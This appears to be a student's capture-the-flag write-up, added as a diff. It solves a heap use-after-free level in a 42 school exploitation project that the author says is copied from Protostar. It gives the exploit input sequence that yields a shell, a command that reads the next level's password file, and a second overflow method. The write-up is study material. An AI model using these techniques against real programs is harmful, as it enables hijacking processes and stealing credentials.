@@ -1,0 +1,47 @@
+0) Randoms test
+	- The arguments seem to be ignored
+	- While runnig the executable it ask for input from stdin
+	- Seems to be in a inf loop of read or just a while that with a exit command
+	- 2 address are displayed but for the moment there are 0x0
+
+1) Binary analysis
+
+WTF 42 copied this level form protostar (so i know to do it because i've done protostar before start this project ...)
+This is not funny and i think they could be more imaginative ...
+Here's the link of protostart: https://exploit.education/protostar/heap-one/
+
+So, why could i say ... ?
+
+The exploit is the classical use-after-free, a memory block is allocated and some pointer to the heap returned by malloc,
+then this pointer is freed but not set to null. If another call to malloc is performed from another pointer, malloc will
+optimize the heap and allocate a memory block there the previous was. So long short, both pointers (the freed one and the allocated)
+will point to the same address. If for example (this case) the first pointer point to a struct and the second one to a string of chars, is possible
+to set whatever we want in the struct if is freed from the string. Just have to calculate the ofsets and put the desired values in the string of chars.
+
+I've realised that 42 not only copied 1 exercice, in fact all this project is a copy form protostart with some little diferences ...
+
+The guy who made this subject was a little bit lazy xD
+
+Well lets proceed with the solution:
+
+~$ auth asd		// 1st ptr
+~$ reset		// free 1st ptr
+~$ service AAA	// allocate some memory block in the heap
+~$ service AAA
+~$ service AAA	// To be sure i overwrite the 1st ptr
+~$ login		// Checks if a parameter in the 1st ptr (is a struct is set to something, normally is NULL)
+				// but is overwriten by the "A"s.
+
+How i've a bash
+
+~$ cat /home/user/level9/.pass
+
+Easy ?
+
+Note after implement the reverse in source.c:
+- Just realised there are another way to do it, the code is so so shitty and all is named "auth", malloc only allocates
+	4 bytes so this exploit can be beated just creating a long service name:
+
+~$ auth asd
+~$ service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+// got a shell
